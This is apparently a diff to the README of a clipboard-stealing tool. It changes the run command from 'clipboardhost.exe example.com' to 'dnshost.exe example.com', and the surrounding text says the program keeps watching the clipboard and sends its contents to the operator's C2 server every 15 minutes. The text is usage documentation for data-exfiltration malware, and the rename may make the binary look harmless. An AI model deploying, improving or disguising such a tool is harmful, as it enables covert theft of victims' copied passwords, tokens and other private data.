@@ -45,7 +45,7 @@ Where:
 - example.com: Your C2 domain address
 
 4. If you are using the .exe you can run it by running the following command:
-`clipboardhost.exe example.com`
+`dnshost.exe example.com`
 
 5. Now you're all set! it will continuously monitor the clipboard for changes and send the data in the clipboard to the C2 server every 15 minutes (Depending on the frequency the user updates his clipboard)
 
